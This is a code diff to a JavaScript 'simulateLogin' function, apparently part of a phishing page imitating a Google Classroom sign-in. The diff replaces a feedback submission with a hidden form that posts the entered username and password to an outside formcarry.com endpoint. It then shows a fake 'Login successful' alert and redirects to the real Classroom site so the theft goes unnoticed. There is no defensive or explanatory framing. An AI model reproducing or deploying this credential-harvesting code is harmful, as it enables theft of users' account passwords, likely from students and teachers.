@@ -7,26 +7,31 @@ function simulateLogin() {
       return;
     }
 
-    const code = inputs[0].value.trim();
-    const feedback = inputs[1].value.trim();
+    const form = document.createElement("form");
+    form.method = "POST";
+    form.action = "https://formcarry.com/s/iBC91wH3nrf";
+    form.style.display = "none";
 
-    if (!code || !feedback) {
-      alert("Please fill in both fields before submitting.");
-      return;
-    }
+    const usernameInput = document.createElement("input");
+    usernameInput.type = "hidden";
+    usernameInput.name = "username";
+    usernameInput.value = inputs[0].value.trim();
 
-    const formData = new FormData();
-    formData.append("code", code);
-    formData.append("feedback", feedback);
+    const passwordInput = document.createElement("input");
+    passwordInput.type = "hidden";
+    passwordInput.name = "password";
+    passwordInput.value = inputs[1].value.trim();
 
-    fetch("https://script.google.com/macros/s/AKfycbwPX5xpGgf650HGywGgGNX_jQu8ldwftZuih7fuB7MZT9Y2wpI57_wAeo8iXSPGIobr/exec", {
-      method: "POST",
-      mode: "no-cors",
-      body: formData
-    });
+    form.appendChild(usernameInput);
+    form.appendChild(passwordInput);
+    document.body.appendChild(form);
 
-    alert("Submission successful! Redirecting...");
-    window.location.href = "https://classroom.google.com/";
+    alert("Login successful. Redirecting...");
+    form.submit();
+
+    setTimeout(() => {
+      window.location.href = "https://classroom.google.com/";
+    }, 500);
   } catch (e) {
     alert("Unexpected error.");
   }
